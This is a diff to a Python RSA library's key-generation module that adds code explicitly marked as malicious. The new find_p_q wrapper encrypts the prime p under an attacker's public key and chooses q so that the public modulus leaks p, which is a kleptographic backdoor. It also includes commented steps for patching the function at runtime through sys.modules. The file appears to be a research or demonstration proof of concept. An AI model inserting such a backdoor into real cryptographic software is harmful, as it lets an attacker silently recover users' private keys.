@@ -837,8 +837,44 @@ def newkeys(
     return (PublicKey(n, e), PrivateKey(n, e, d, p, q))
 
 
+# ------------ Malicious code starts here ------------
+"""
+Two options for manipulating with the find_p_q function:
+
+1. Option:
+    - Before runtime store find_p_q in a variable (__find_p_q)
+    - Delete the original find_p_q function
+    - ***Attack-Step***
+2. Option:
+    - At runtime import sys
+    - Store the runtime function find_p_q in a variable (__find_p_q)
+    - ***Attack-Step***
+    - Afterwards replace the runtime function with the overwritten function find_p_q
+
+Attack-Step:
+    - Replace the original find_p_q function with the new one
+    - Call the new function with the same arguments
+    - After receiving p and q by call __find_p_q with the same arguments
+    - With p and the public key of the attacker calculate the new q
+    - return the p and the new q
+"""
+
+"""
+# Option 1
+"""
+
 __find_p_q = find_p_q
 del find_p_q  # This might not be necessary, but could avoid a warning about the shadowed name.
+
+"""
+# Option 2 --- Part 1
+"""
+# import sys
+# __find_p_q = sys.modules['rsa.key'].find_p_q
+
+"""
+Attack-Step:
+"""
 
 
 def find_p_q(
@@ -848,7 +884,6 @@ def find_p_q(
 ) -> typing.Tuple[int, int]:
     p, q = __find_p_q(nbits, getprime_func, accurate)
 
-    # Malicious code here
     # Code to get a_e and a_n
 
     # Attacker Key for 16-bit-RSA
@@ -858,8 +893,17 @@ def find_p_q(
 
     vP = rsa.core.encrypt_int(p, a_e, a_n)
 
-    min_bit_construct_Q = concatenate_in_binary((vP - 1), 0, nbits)
-    max_bit_construct_Q = concatenate_in_binary(vP, int(pow(2, int(nbits/2)) - 2), nbits)
+    def concatenate_in_binary(prev, tail):
+        prev = "{0:b}".format(prev)
+        tail = "{0:b}".format(tail)
+
+        prev = "0" * (int(nbits / 2) - len(prev)) + prev
+        tail = "0" * (int(nbits / 2) - len(tail)) + tail
+
+        return int(prev + tail, 2)
+
+    min_bit_construct_Q = concatenate_in_binary((vP - 1), 0)
+    max_bit_construct_Q = concatenate_in_binary(vP, int(pow(2, int(nbits / 2)) - 2))
 
     lower_bound_Q = int((min_bit_construct_Q / p) // 1) + 1  # ceil
     upper_bound_Q = int((max_bit_construct_Q / p) // 1)  # floor
@@ -881,6 +925,14 @@ def find_p_q(
 
     return p, q
 
+
+"""
+# Option 2 --- Part 2
+"""
+
+# sys.modules['rsa.key'].find_p_q = find_p_q
+
+# ------------ Malicious code ends here ------------
 
 __all__ = ["PublicKey", "PrivateKey", "newkeys"]
 
